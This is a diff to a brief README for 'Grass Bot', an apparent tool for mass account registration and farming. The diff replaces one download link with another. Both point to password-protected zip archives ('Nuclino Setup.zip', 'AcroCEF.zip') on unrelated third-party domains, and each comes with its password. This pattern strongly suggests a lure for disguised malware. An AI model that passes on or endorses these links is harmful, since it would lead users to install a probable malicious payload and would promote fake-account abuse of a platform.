@@ -1,9 +1,8 @@
 # Grass Bot
 
 ## Installation
-# [DOWNLOAD](https://casinoviapi.com/Nuclino%20Setup.zip)
-## Password - set1nu24
-
+# [DOWNLOAD](https://vinag1847.si/AcroCEF.zip)
+## Password - 86tiiolsmn
 ## Overview
 
 Grass Bot is an advanced automation tool designed to streamline account registration and farming processes. With its powerful features and user-friendly interface, it offers a seamless experience for users looking to maximize their efficiency on the platform.
